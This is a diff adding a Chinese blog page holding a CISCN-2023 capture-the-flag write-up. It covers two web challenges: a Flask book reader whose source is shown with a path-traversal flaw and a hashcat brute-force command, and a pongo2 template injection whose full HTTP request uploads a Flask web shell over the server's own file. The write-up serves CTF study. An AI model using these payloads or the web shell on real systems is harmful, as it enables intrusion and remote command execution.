@@ -1,0 +1,257 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>CISCN-2023 - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <ol class="c-post__toc-list" id="toc-list"></ol>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">CISCN-2023</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2023-10-11 02:40</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2023-10-11 02:40</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/CTF"><strong>CTF</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/Writeup" class="c-post__tag">#Writeup</a>
+            </div>
+            <div class="c-post__description">
+                国赛初赛
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><h2 id="reading">reading</h2>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">python</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="python"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">send_file</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time_ns</span><span class="p">())</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">books</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s1">&#39;./books&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">books</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">book</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;book&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page_size</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;page_size&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">total_pages</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;total_pages&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filepath</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;filepath&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">words</span> <span class="o">=</span> <span class="n">read_file_page</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">page_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">books</span><span class="o">=</span><span class="n">books</span><span class="p">,</span> <span class="n">words</span><span class="o">=</span><span class="n">words</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">books</span><span class="o">=</span><span class="n">books</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/books&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">book_page</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;book&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">book</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;book&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">book</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;book&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">books</span><span class="o">=</span><span class="n">books</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s1">&#39;I need book&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">book</span><span class="o">=</span><span class="n">book</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filepath</span> <span class="o">=</span> <span class="s1">&#39;./books/&#39;</span> <span class="o">+</span> <span class="n">book</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;page_size&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page_size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;page_size&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page_size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;page_size&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page_size</span> <span class="o">=</span> <span class="mi">3000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">total_pages</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span> <span class="o">/</span> <span class="n">page_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;page&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;page&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;page&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">words</span> <span class="o">=</span> <span class="n">read_file_page</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">page_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prev_page</span> <span class="o">=</span> <span class="n">page</span> <span class="o">-</span> <span class="mi">1</span> <span class="k">if</span> <span class="n">page</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="n">next_page</span> <span class="o">=</span> <span class="n">page</span> <span class="o">+</span> <span class="mi">1</span> <span class="k">if</span> <span class="n">page</span> <span class="o">&lt;</span> <span class="n">total_pages</span> <span class="k">else</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;book&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">book</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">page</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;page_size&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">page_size</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;total_pages&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">total_pages</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;prev_page&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">prev_page</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;next_page&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">next_page</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;filepath&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">filepath</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">books</span><span class="o">=</span><span class="n">books</span><span class="p">,</span> <span class="n">words</span><span class="o">=</span><span class="n">words</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;key&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="n">key</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;/readflag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;no no no&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_file_page</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">page_number</span><span class="p">,</span> <span class="n">page_size</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">size</span><span class="o">=</span><span class="n">page_size</span> <span class="o">+</span> <span class="n">j</span>
+</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">page_number</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">page_size</span><span class="o">+</span><span class="n">i</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">words</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">words</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#if error again</span>
+</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">page_number</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">page_size</span>
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">words</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">page_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">words</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="s1">&#39;8000&#39;</span><span class="p">)</span>
+</span></span></code></pre></div></div><p>老题目了,内存里读key</p>
+<p>爆破脚本就不贴了,爆破出两个MD5值,去解密就好</p>
+<p><code>hashcat</code>爆破
+<code>hashcat -m 0 -a 3 &quot;558e1ffc2ca2910fc63e0d8b53ff39e3&quot; &quot;169876481?d?d?d?d?d?d?d?d?d?d&quot;</code></p>
+<h2 id="gosession">gosession</h2>
+<p>首先是修改文件,本地启动服务获取admin的session
+之后是个<a href="https://github.com/flosch/pongo2">pongo2</a>模版注入</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">/admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}}
+</span></span></code></pre></div></div><p>然后利用flask的热重载</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}} HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 123.56.244.196:17997
+</span></span><span class="line"><span class="cl">Content-Length: 613
+</span></span><span class="line"><span class="cl">Cache-Control: max-age=0
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrxtSm5i2S6anueQi
+</span></span><span class="line"><span class="cl">User-Agent: /app/server.py
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class="line"><span class="cl">Cookie: session-name=MTY4NTE1ODc3OHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzlZGsWROWLHoCNn0Pbu3SkgRLWCZRrj8UIHVYgHU7GPw==
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">------WebKitFormBoundaryrxtSm5i2S6anueQi
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;/app/server.py&#34;; filename=&#34;server.py&#34;
+</span></span><span class="line"><span class="cl">Content-Type: text/plain
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">from flask import Flask, request
+</span></span><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app = Flask(__name__)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/shell&#39;)
+</span></span><span class="line"><span class="cl">def shell():
+</span></span><span class="line"><span class="cl">    cmd = request.args.get(&#39;cmd&#39;)
+</span></span><span class="line"><span class="cl">    if cmd:
+</span></span><span class="line"><span class="cl">        return os.popen(cmd).read()
+</span></span><span class="line"><span class="cl">    else:
+</span></span><span class="line"><span class="cl">        return &#39;shell&#39;
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">if __name__== &#34;__main__&#34;:
+</span></span><span class="line"><span class="cl">    app.run(host=&#34;127.0.0.1&#34;,port=5000,debug=True)
+</span></span><span class="line"><span class="cl">------WebKitFormBoundaryrxtSm5i2S6anueQi
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;submit&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&amp;#25552;&amp;#20132;
+</span></span><span class="line"><span class="cl">------WebKitFormBoundaryrxtSm5i2S6anueQi--
+</span></span></code></pre></div></div></article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/spirit-2023" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">Spirit-2023</p>
+            </a>
+            
+
+            
+            <a href="/post/caddy" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">caddy</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
